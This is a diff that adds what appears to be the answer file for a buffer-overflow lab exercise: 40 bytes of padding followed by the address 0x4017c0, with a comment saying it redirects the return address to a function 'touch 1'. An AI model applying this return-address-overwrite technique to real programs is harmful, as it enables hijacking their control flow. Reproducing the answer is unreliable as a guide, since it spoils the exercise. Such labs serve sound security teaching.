@@ -1,0 +1,5 @@
+aa aa aa aa aa aa aa aa aa aa
+aa aa aa aa aa aa aa aa aa aa
+aa aa aa aa aa aa aa aa aa aa
+aa aa aa aa aa aa aa aa aa aa
+c0 17 40 00 /* length from buf to ret address is 40 bytes, the address of touch 1 is 0x4017c0 */ 
